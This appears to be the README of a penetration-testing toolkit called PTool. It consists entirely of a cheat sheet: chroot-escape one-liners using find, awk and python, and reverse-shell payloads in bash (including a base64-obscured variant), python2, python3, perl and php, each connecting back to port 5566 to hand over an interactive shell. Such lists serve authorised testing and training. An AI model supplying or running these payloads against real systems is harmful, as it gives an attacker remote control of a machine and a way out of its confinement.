# PTool #
The [penetration test][0] tool set.

## Cheat Sheet ##

### chroot escape ###

| binary | script                                      |
|========|=============================================|
| find   | find -exec '/bin/sh'                        |
|--------|---------------------------------------------|
| awk    | awk 'BEGIN {system("/bin/sh")}'             |
|--------|---------------------------------------------|
| python | python -c 'import os; os.system("/bin/sh")' |

### reversed shell ###

| language | shell                                                                           |
|==========|=================================================================================|
| bash     | bash -i >& /dev/tcp/127.0.0.1/5566 0>&1                                         |
|----------|---------------------------------------------------------------------------------|
| bash     | echo -n "/bin/sh -i >& /dev/tcp/127.0.0.1/5566 0>&1" | base64 | base64 -d | sh  |
|----------|---------------------------------------------------------------------------------|
| python2  | import socket, os;                                                              |
|----------|---------------------------------------------------------------------------------|
|          | sk = socket.create_connection(("127.0.0.1", 5566));                             |
|          | fd = sk.fileno();                                                               |
|          | os.popen("bash -i <&{0} >&{0} 2>&{0}".format(fd));                              |
|----------|---------------------------------------------------------------------------------|
| python3  | import socket, os, subprocess;                                                  |
|          | sk = socket.create_connection(("127.0.0.1", 5566));                             |
|          | fd = sk.fileno();                                                               |
|          | subprocess.Popen(["/bin/sh", "-c", f"/bin/sh -i <{fd} >&{fd} 2>&{fd}"]);        |
|----------|---------------------------------------------------------------------------------|
| perl     | use Socket;                                                                     |
|          | socket(s, AF_INET, SOCK_STREAM, 0);                                             |
|          | connect(s, pack_sockaddr_in(5566, inet_aton("127.0.0.1"))) or die;              |
|          | open(STDIN, ">&s"); open(STDOUT, ">&s"); open(STDERR, ">&s");                   |
|          | exec("/bin/sh -i");                                                             |
|----------|---------------------------------------------------------------------------------|
| php      | <?php $sk = fsockopen("127.0.0.1", 5566); exec("/bin/bash -i <&3 >&3 2>&3"); ?> |


[0]: https://en.wikipedia.org/wiki/Penetration_test
